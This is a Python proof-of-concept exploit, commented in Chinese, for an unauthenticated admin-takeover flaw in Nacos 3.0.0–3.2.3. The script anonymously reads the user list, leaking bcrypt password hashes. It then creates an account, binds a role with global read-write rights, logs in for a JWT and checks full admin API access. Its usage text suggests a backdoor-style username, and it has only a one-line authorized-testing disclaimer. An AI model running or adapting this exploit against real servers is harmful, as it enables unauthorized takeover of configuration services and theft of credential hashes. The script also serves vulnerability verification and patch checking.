#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nacos 3.x 未授权创建管理员用户致完全接管漏洞 PoC
================================================

漏洞:   /v3/auth/{user,role,permission} 鉴权作用域错配（落入默认不鉴权的 OPEN_API 桶）
影响:   Nacos 3.0.0 - 3.2.3（默认配置即可利用，无需任何凭证）
修复:   3.3.0-BETA 起（PR #15563），3.2.4 已回移

流程:
    [0] 指纹/路径探测（自动识别 / 与 /nacos 上下文）
    [1] 匿名 GET /v3/auth/user/list        —— 侧证: 同桶接口匿名可达（泄露用户名+bcrypt）
    [2] 匿名 POST /v3/auth/user            —— 创建随机用户
    [3] 匿名 POST /v3/auth/role            —— 创建角色并绑定
    [4] 匿名 POST /v3/auth/permission      —— 授予 resource=* action=rw（全局读写）
    [5] 等待权限缓存刷新（默认 15s）
    [6] POST /v3/auth/user/login           —— 登录自建账户拿 JWT
    [7] GET /v3/admin/core/namespace/list  —— 携带 JWT 验证 ADMIN API 完全访问

用法:
    python3 poc_nacos_unauth_admin.py -t http://target:8848
    python3 poc_nacos_unauth_admin.py -t http://target:8848 --username b4ckd00r --password P@ss!
    python3 poc_nacos_unauth_admin.py -t http://target:8848 --no-proxy --cache-wait 18

退出码: 0=漏洞存在且接管成功  1=漏洞不存在/已修复  2=疑似存在但未完全验证
仅限授权测试使用。
"""

import argparse
import json
import random
import string
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()


def rand(n):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class NacosUnauthAdmin:
    def __init__(self, target, username=None, password=None, cache_wait=18,
                 no_proxy=False, timeout=10):
        self.s = requests.Session()
        if no_proxy:
            self.s.trust_env = False
        self.no_proxy = no_proxy
        self.timeout = timeout
        self.cache_wait = cache_wait
        self.user = username or ("poc_" + rand(10))
        self.pwd = password or (rand(6) + random.choice("!@#$%") + rand(8))
        self.role = "r_" + rand(6)
        self.base = self._resolve_base(target)
        self.token = None

    # ---------- [0] 基址探测 ----------
    def _resolve_base(self, target):
        import os
        base = target.rstrip("/")
        probe = "/v3/auth/user/list?pageNo=1&pageSize=1"
        gateway_codes = []
        for cand in (base, base + "/nacos"):
            try:
                r = self.s.get(cand + probe, timeout=self.timeout, verify=False)
                if r.status_code in (200, 401, 403):
                    return cand
                if r.status_code in (502, 504):
                    gateway_codes.append((cand, r.status_code))
            except requests.RequestException:
                continue
        if gateway_codes:
            hint = ""
            if not self.no_proxy and (os.environ.get("http_proxy") or os.environ.get("all_proxy")):
                hint = "\n[-] 检测到环境代理（http_proxy/all_proxy），大概率是代理回的 502，请加 --no-proxy 重试"
            print(f"[-] 全部候选路径返回网关错误 {[f'{c} -> {s}' for c, s in gateway_codes]}："
                  f"请求未到达 Nacos（中间代理/网关不可达上游，或目标端口/地址错误）{hint}")
        else:
            print("[-] 无法识别 Nacos 服务或路径（尝试过 / 与 /nacos），目标不可达或非 Nacos")
        sys.exit(1)

    def req(self, method, path, params=None, token=None):
        headers = {"User-Agent": "Mozilla/5.0"}
        if token:
            headers["Authorization"] = "Bearer " + token
        return self.s.request(method, self.base + path, params=params,
                              headers=headers, timeout=self.timeout, verify=False)

    # ---------- 主流程 ----------
    def run(self):
        print(f"[*] target : {self.base}")
        print(f"[*] account: {self.user} / {self.pwd}  (role: {self.role})")

        # [1] 同桶匿名读侧证
        r = self.req("GET", "/v3/auth/user/list?pageNo=1&pageSize=100")
        if r.status_code == 200 and '"pageItems"' in r.text:
            try:
                items = json.loads(r.text)["data"]["pageItems"]
                print(f"[1] 匿名读取用户列表成功: {len(items)} 个用户（含 bcrypt 哈希泄露）")
            except Exception:
                print("[1] 匿名读取用户列表: 200（解析失败，继续）")
        else:
            print(f"[1] 匿名读取用户列表: HTTP {r.status_code}"
                  f"{'（≥3.3.0/3.2.4，疑似已修复）' if r.status_code == 403 else ''}")

        # [2] 匿名创建用户
        r = self.req("POST", "/v3/auth/user", {"username": self.user, "password": self.pwd})
        print(f"[2] POST /v3/auth/user        -> {r.status_code} {r.text[:80]}")
        if r.status_code != 200 or '"code":0' not in r.text.replace(" ", ""):
            self._fail(r, "用户创建被拒")

        # [3] 匿名创建并绑定角色
        r = self.req("POST", "/v3/auth/role", {"username": self.user, "role": self.role})
        print(f"[3] POST /v3/auth/role        -> {r.status_code} {r.text[:80]}")
        if r.status_code != 200:
            self._fail(r, "角色创建被拒")

        # [4] 匿名授予全局读写权限
        r = self.req("POST", "/v3/auth/permission",
                     {"role": self.role, "resource": "*", "action": "rw"})
        print(f"[4] POST /v3/auth/permission  -> {r.status_code} {r.text[:80]}")
        if r.status_code != 200:
            self._fail(r, "权限授予被拒")

        # [5] 等待权限缓存刷新
        print(f"[5] 等待权限缓存刷新 {self.cache_wait}s ...")
        time.sleep(self.cache_wait)

        # [6] 登录拿 JWT
        r = self.req("POST", "/v3/auth/user/login",
                     {"username": self.user, "password": self.pwd})
        print(f"[6] POST /v3/auth/user/login  -> {r.status_code}")
        if r.status_code != 200:
            print(f"    登录失败: {r.text[:120]}")
            sys.exit(2)
        try:
            self.token = json.loads(r.text)["accessToken"]
        except Exception:
            print(f"    响应无 accessToken: {r.text[:120]}")
            sys.exit(2)

        # [7] 验证 ADMIN API 完全访问
        r = self.req("GET", "/v3/admin/core/namespace/list", token=self.token)
        print(f"[7] GET  /v3/admin/core/namespace/list -> {r.status_code} {r.text[:100]}")
        if r.status_code == 200 and '"code":0' in r.text:
            print()
            print("[+] 漏洞存在，完全接管成功: 未认证 -> 全局管理员")
            print(f"[+] 管理员账户: {self.user} / {self.pwd}")
            print(f"[+] JWT: {self.token[:60]}...")
            sys.exit(0)
        else:
            print("[!] 疑似漏洞存在（建号成功）但 ADMIN API 验证未通过，可增大 --cache-wait 重试")
            sys.exit(2)

    @staticmethod
    def _fail(r, why):
        if r.status_code == 403:
            print(f"[-] {why}: HTTP 403 —— 目标疑似已修复（≥3.2.4 / 3.3.0）")
            sys.exit(1)
        print(f"[-] {why}: HTTP {r.status_code} {r.text[:120]}")
        sys.exit(2)


def main():
    ap = argparse.ArgumentParser(description="Nacos 3.x 未授权提权 PoC（3.0.0-3.2.3）")
    ap.add_argument("-t", "--target", required=True,
                    help='目标基址，如 http://1.2.3.4:8848（/nacos 上下文自动探测）')
    ap.add_argument("--username", help="自建账户名（默认随机）")
    ap.add_argument("--password", help="自建账户密码（默认随机）")
    ap.add_argument("--cache-wait", type=int, default=18,
                    help="权限缓存刷新等待秒数（默认 18）")
    ap.add_argument("--no-proxy", action="store_true",
                    help="忽略环境变量代理（本地/回环测试时使用）")
    args = ap.parse_args()
    NacosUnauthAdmin(args.target, args.username, args.password,
                     args.cache_wait, args.no_proxy).run()


if __name__ == "__main__":
    main()
